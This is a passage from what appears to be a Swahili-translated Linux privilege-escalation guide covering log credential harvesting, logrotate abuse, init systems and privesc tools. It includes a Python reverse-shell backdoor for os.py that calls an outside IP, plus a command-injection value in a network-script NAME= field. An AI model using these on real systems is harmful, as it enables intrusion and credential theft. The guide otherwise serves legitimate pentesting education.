**Tool nyingine ya kuvutia** unayoweza kutumia kufanya hivyo ni: [**LaZagne**](https://github.com/AlessandroZ/LaZagne), ambayo ni application ya open source inayotumika kupata passwords nyingi zilizohifadhiwa kwenye computer ya ndani kwa Windows, Linux & Mac.

### Logs

Ikiwa unaweza kusoma logs, huenda ukaweza kupata **taarifa za kuvutia/siri ndani yake**. Kadiri log inavyokuwa ya ajabu, ndivyo itakavyokuwa ya kuvutia zaidi (huenda).\
Pia, baadhi ya **audit logs** zilizosanidiwa "**vibaya**" (backdoored?) zinaweza kukuruhusu **kurekodi passwords** ndani ya audit logs kama ilivyoelezwa katika post hii: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).<sup>[[36]](#references)</sup>
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Ili **kusoma logs,** kuwa katika group [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) kutasaidia sana.

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Utafutaji wa Generic Creds/Regex

Unapaswa pia kuangalia files zenye neno "**password**" katika **jina** lake au ndani ya **content**, na pia kuangalia IPs na emails ndani ya logs, au regexps za hashes.\
Sitaorodhesha hapa jinsi ya kufanya yote haya, lakini ikiwa una nia unaweza kuangalia checks za mwisho ambazo [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) hufanya.

## Files Zinazoweza Kuandikwa

### Python library hijacking

Ikiwa unajua **wapi** python script itatekelezwa na **unaweza kuandika ndani ya** folder hiyo au unaweza **kubadilisha python libraries**, unaweza kubadilisha OS library na kuiwekea backdoor (ikiwa unaweza kuandika mahali python script itatekelezwa, copy na paste library ya os.py).

Ili **kuweka backdoor kwenye library**, ongeza tu mwishoni mwa library ya os.py mstari ufuatao (badilisha IP na PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Unyonyaji wa logrotate

Athari ya kiusalama katika `logrotate` huwawezesha watumiaji walio na **ruhusa za kuandika** kwenye faili ya log au directories zake kuu kupata uwezekano wa kupandisha privileges. Hii ni kwa sababu `logrotate`, ambayo mara nyingi huendeshwa kama **root**, inaweza kudanganywa ili kutekeleza faili kiholela, hasa katika directories kama _**/etc/bash_completion.d/**_. Ni muhimu kukagua permissions si katika _/var/log_ pekee, bali pia katika directory yoyote ambayo log rotation inatumika.

> [!TIP]
> Athari hii inaathiri `logrotate` version `3.18.0` na za zamani zaidi

Maelezo zaidi kuhusu athari hii yanaweza kupatikana kwenye ukurasa huu: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).<sup>[[37]](#references)</sup>

Unaweza kutumia vulnerability hii kwa [**logrotten**](https://github.com/whotwagner/logrotten).

Vulnerability hii inafanana sana na [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** kwa hivyo kila unapogundua kuwa unaweza kubadilisha logs, chunguza ni nani anayesimamia logs hizo na uangalie kama unaweza kupandisha privileges kwa kubadilisha logs hizo kwa symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Rejeleo la vulnerability:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f).<sup>[[20]](#references)</sup>

Ikiwa, kwa sababu yoyote, mtumiaji anaweza **kuandika** script ya `ifcf-<whatever>` kwenye _/etc/sysconfig/network-scripts_ **au** anaweza **kurekebisha** script iliyopo, basi **system yako imekuwa pwned**.<sup>[[20]](#references)</sup>

Network scripts, kwa mfano _ifcg-eth0_, hutumiwa kwa connections za network. Zinaonekana sawa kabisa na faili za .INI. Hata hivyo, huwa \~sourced\~ kwenye Linux na Network Manager (dispatcher.d).

Katika hali yangu, attribute ya `NAME=` katika network scripts hizi haishughulikiwi kwa usahihi. Ikiwa kuna **nafasi tupu/blanki katika jina, system hujaribu kutekeleza sehemu iliyo baada ya nafasi tupu/blanki**. Hii inamaanisha kwamba **kila kitu baada ya nafasi tupu/blanki ya kwanza hutekelezwa kama root**.

Kwa mfano: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Kumbuka nafasi tupu kati ya Network na /bin/id_)

### **init, init.d, systemd, na rc.d**

Directory `/etc/init.d` ina **scripts** za System V init (SysVinit), **mfumo wa kawaida wa zamani wa Linux wa usimamizi wa services**. Inajumuisha scripts za `start`, `stop`, `restart`, na wakati mwingine `reload` services. Hizi zinaweza kutekelezwa moja kwa moja au kupitia symbolic links zinazopatikana katika `/etc/rc?.d/`. Njia mbadala katika mifumo ya Redhat ni `/etc/rc.d/init.d`.

Kwa upande mwingine, `/etc/init` inahusishwa na **Upstart**, **mfumo mpya zaidi wa usimamizi wa services** ulioanzishwa na Ubuntu, unaotumia configuration files kwa kazi za usimamizi wa services. Licha ya mpito kwenda Upstart, SysVinit scripts bado hutumika pamoja na Upstart configurations kutokana na compatibility layer iliyo katika Upstart.

**systemd** huibuka kama initialization na service manager ya kisasa, ikitoa vipengele vya juu kama vile kuanzisha daemons inapohitajika, usimamizi wa automount, na snapshots za hali ya mfumo. Hupanga files katika `/usr/lib/systemd/` kwa distribution packages na `/etc/systemd/system/` kwa marekebisho ya administrator, na kurahisisha mchakato wa system administration.<sup>[[21]](#references)</sup>

## Tricks Nyingine

### Privilege escalation ya NFS


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Kujinasua kutoka restricted Shells


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../network-information/cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: matumizi mabaya ya manager-channel

Android rooting frameworks kwa kawaida hu-hook syscall ili kufichua functionality ya kernel yenye privileges kwa manager wa userspace. Authentication dhaifu ya manager (kwa mfano, signature checks zinazotegemea mpangilio wa FD au password schemes dhaifu) inaweza kuwezesha app ya ndani kujifanya manager na kufanya privilege escalation hadi root kwenye devices ambazo tayari zime-rootiwa. Jifunze zaidi na maelezo ya exploitation hapa:


{{#ref}}
../../software-information/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) kupitia exec inayotegemea regex (CVE-2025-41244)

Service discovery inayotegemea regex katika VMware Tools/Aria Operations inaweza kutoa binary path kutoka kwenye command lines za processes na kui-execute kwa -v ndani ya privileged context. Patterns zinazoruhusu mengi (kwa mfano, kutumia \S) zinaweza ku-match listeners zilizowekwa na attacker katika maeneo yanayoweza kuandikwa (kwa mfano, /tmp/httpd), na kusababisha execution kama root (CWE-426 Untrusted Search Path).<sup>[[27]](#references)</sup>

Jifunze zaidi na uone pattern ya jumla inayoweza kutumika kwa discovery/monitoring stacks nyingine hapa:

{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Msaada zaidi

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Tool bora ya kutafuta vectors za local privilege escalation kwenye Linux:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Orodhesha kernel vulns katika Linux na MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Mkusanyiko wa scripts zaidi**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [1] [0xdf – HTB Planning (Privilege escalation ya Crontab UI, matumizi tena ya zip -P creds)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [2] [0xdf – HTB Era: payload ya .text_sig iliyoghushiwa kwa monitor inayotekelezwa na cron](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [3] [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [4] [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [5] [Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [6] [Mwongozo wa Linux Privilege Escalation](https://payatu.com/guide-linux-privilege-escalation/)
- [7] [Attack and Defend: Mbinu za Linux Privilege Escalation za 2016](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [8] [Hakuna aliyetarajia command execution!](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [9] [Sudo (LD_PRELOAD) (Linux Privilege Escalation)](https://touhidshaikh.com/blog/?p=827)
- [10] [lpeworkshop – Mwongozo wa mazoezi ya Lab - Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [11] [frizb/Linux-Privilege-Escalation: Vidokezo na Tricks za Linux Priv Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [12] [lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [13] [rtcrowley/linux-private-i: Tool ya Linux Enumeration & Privilege Escalation](https://github.com/rtcrowley/linux-private-i)
- [14] [Socket ni nini?](https://www.linux.com/news/what-socket/)
- [15] [Peppo (Proving Grounds) writeup](https://muzec0318.github.io/posts/PG/peppo.html)
- [16] [Pata ufikiaji wa D-BUS](https://www.linuxjournal.com/article/7744)
- [17] [SUID Executables Linux Privilege Escalation](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [18] [Sudo Sehemu ya 2 – Linux Privilege Escalation](https://juggernaut-sec.com/sudo-part-2-lpe)
- [19] [Jinsi ya kusimamia ACLs kwenye Linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [20] [Redhat/CentOS root kupitia network-scripts](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [21] [systemd ni nini?](https://www.linode.com/docs/guides/what-is-systemd/)
- [22] [0xdf – HTB Eureka (bash arithmetic injection kupitia logs, chain nzima)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [23] [GNU Bash Manual – BASH_ENV (startup file isiyo ya interactive)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [24] [0xdf – HTB Environment (sudo env_keep BASH_ENV -> root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [25] [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [26] [0xdf – HTB Slonik (pg_basebackup cron copy -> SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [27] [NVISO – Unaitaje, VMware huiinua (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [28] [Stratascale – CVE-2025-32463: Sudo Chroot Elevation of Privilege](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)
- [29] [Rich Mirch – CVE-2025-32462 na CVE-2025-32463 Sudo elevation-of-privilege vulnerabilities](https://blog.mirch.io/sudo-elevation-of-privilege-vulnerabilities/)
- [30] [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [31] [PEP 3147 – PYC Repository Directories](https://peps.python.org/pep-3147/)
- [32] [Python importlib docs](https://docs.python.org/3/library/importlib.html)
- [33] [polkit/polkit issue #74](https://gitlab.freedesktop.org/polkit/polkit/issues/74)
- [34] [mirchr/security-research](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)
- [35] [Tweet ya @paragonsec](https://twitter.com/paragonsec/status/1071152249529884674)
- [36] [redsiege.com - Kurekodi Passwords kwenye Linux](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux)
- [37] [tech.feedyourhead.at - Maelezo ya Logrotate Race Condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
{{#include ../../../banners/hacktricks-training.md}}
